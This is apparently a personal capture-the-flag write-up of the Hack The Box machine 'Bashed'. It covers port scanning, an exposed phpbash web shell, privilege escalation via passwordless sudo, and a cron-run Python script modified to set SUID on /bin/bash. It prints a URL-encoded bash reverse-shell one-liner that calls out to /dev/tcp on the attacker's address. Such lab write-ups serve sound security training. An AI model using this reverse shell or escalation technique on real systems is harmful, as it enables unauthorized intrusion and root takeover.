---
description: Easy machine OSCP style
---

# Bashed

## Reconnaissance

Ensuring the machine is up by pinging it. Moreover, it is a Linux machine due to the TTL is 63 (should be 64, but the packet jumps over an intermediary node of htb). For Windows machines, the TTL should be 128, or in this case 127.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 11.35.03.png" alt=""><figcaption></figcaption></figure>

Scanning for open ports using nmap. Only port 80 is open.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 11.36.41.png" alt=""><figcaption></figcaption></figure>

We perform a version detection scan over the port 80 to know what version of the server is running.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 11.37.36.png" alt=""><figcaption></figcaption></figure>

Then, nothing interesting was found so we launch a http enumeration script over the http server to look for interesting paths. After investigating in some of them, we notice that /dev is the interesting one.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 11.44.01.png" alt=""><figcaption></figcaption></figure>

## Exploiting

Inside the /dev directory, there is a file called phpbash which enables to launch a web shell where we can run commands as the user www-data.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 11.53.36.png" alt=""><figcaption></figcaption></figure>

This is the aspect of the web shell. Now, we do not want to keep executing commands on the web shell so we send the shell to our host. We start listening on the 443 port on our host and then we execute this command in the shell to send it to the host:

```
bash -c "bash -i >%26 /dev/tcp/10.10.14.4/443 0>%261"
```

**Notice that we use %26 as it is the URL encode code for "&" and in some cases the revershe shell is not established.**&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 11.53.56.png" alt=""><figcaption></figcaption></figure>

Now we just got the shell.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 11.54.32.png" alt=""><figcaption></figcaption></figure>

## Privilege escalation

After running some commands to get an interactive shell, we look for what root privileges does the user have. We notice that the user scriptmanager can run root commands without password.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 11.57.59.png" alt=""><figcaption></figcaption></figure>

Then we switch to the user scriptmanager.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 12.00.05.png" alt=""><figcaption></figcaption></figure>

After that, we look for files with SUID privileges to exploit them but there is nothing interesting at first.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 12.00.42.png" alt=""><figcaption></figcaption></figure>

After looking into the /var/www/html directory, there is a /script directory which has a python script and a text file. Looking into the content of those files we notice that the python script only writes some text onto the text file. So we just need to modify that script to get suid privileges on the /bin/bash.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 12.06.10.png" alt=""><figcaption></figcaption></figure>

We modify the script so when it gets executed, the suid will be applied to the /bin/bash so the user could run a bash as root.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 12.10.00.png" alt=""><figcaption></figcaption></figure>

Having a bash as root, we just get the flag and PWNED!

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 12.12.48.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-23 a las 12.11.59.png" alt=""><figcaption></figcaption></figure>
